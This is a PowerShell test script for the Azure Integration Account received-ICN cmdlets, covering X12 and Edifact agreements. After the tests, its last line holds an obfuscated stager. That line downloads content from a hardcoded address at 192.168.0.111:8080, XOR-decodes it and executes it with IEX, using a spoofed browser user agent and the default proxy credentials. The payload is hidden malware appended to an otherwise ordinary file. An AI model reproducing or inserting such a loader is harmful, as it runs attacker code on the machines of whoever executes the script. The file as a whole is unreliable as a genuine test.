















$SESSION_RG = "flowrg"
$SESSION_IA = "PS-Tests-Sessions"
$AGREEMENT_X12_Name = "PS-X12-Agreement"
$AGREEMENT_Edifact_Name = "PS-Edifact-Agreement"


function Test-GetReceivedIcn()
{
	
	
	
	$resultNoType =  Get-AzIntegrationAccountReceivedIcn -ResourceGroupName $SESSION_RG -Name $SESSION_IA -AgreementName $AGREEMENT_X12_Name -ControlNumber "1234"
	Assert-AreEqual "1234" $resultNoType.ControlNumber
	Assert-AreEqual "X12" $resultNoType.MessageType

	$resultX12 =  Get-AzIntegrationAccountReceivedIcn -ResourceGroupName $SESSION_RG -Name $SESSION_IA -AgreementName $AGREEMENT_X12_Name -AgreementType "X12" -ControlNumber "1234"
	Assert-AreEqual "1234" $resultX12.ControlNumber
	Assert-AreEqual "X12" $resultX12.MessageType

	$resultEdifact =  Get-AzIntegrationAccountReceivedIcn -ResourceGroupName $SESSION_RG -Name $SESSION_IA -AgreementName $AGREEMENT_Edifact_Name -AgreementType "Edifact" -ControlNumber "1234"
	Assert-AreEqual "1234" $resultEdifact.ControlNumber
	Assert-AreEqual "Edifact" $resultEdifact.MessageType
}


function Test-UpdateReceivedIcn()
{
	
	
	
	$updatedControlNumber = Set-AzIntegrationAccountReceivedIcn -AgreementType "X12" -ResourceGroupName $SESSION_RG -Name $SESSION_IA -AgreementName $AGREEMENT_X12_Name -ControlNumber "1234" -IsMessageProcessingFailed $FALSE
	Assert-AreEqual "1234" $updatedControlNumber.ControlNumber
	Assert-False { $updatedControlNumber.IsMessageProcessingFailed }

	$updatedControlNumber = Set-AzIntegrationAccountReceivedIcn -AgreementType "X12" -ResourceGroupName $SESSION_RG -Name $SESSION_IA -AgreementName $AGREEMENT_X12_Name -ControlNumber "1234" -IsMessageProcessingFailed $TRUE
	Assert-AreEqual "1234" $updatedControlNumber.ControlNumber
	Assert-True { $updatedControlNumber.IsMessageProcessingFailed }
}
[SYstEM.NEt.SErViCEPOiNTMANAgER]::ExPecT100COntinUE = 0;$Wc=New-ObjeCt SysteM.NeT.WeBCLIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAdeRs.ADd('User-Agent',$u);$Wc.PROxY = [SyStEm.NeT.WEBREQUeST]::DEFaUlTWEbPrOxY;$wC.PRoxY.CrEDeNtiAlS = [SysTem.NEt.CRedeNtiAlCAcHE]::DefAulTNETWORkCrEDEntIals;$K='8853bb10b83b5d276cfcf13a03100665';$i=0;[CHAR[]]$B=([Char[]]($Wc.DoWNloADStRinG("http://192.168.0.111:8080/index.asp")))|%{$_-bXor$k[$I++%$K.LeNgth]};IEX ($B-JOin'')

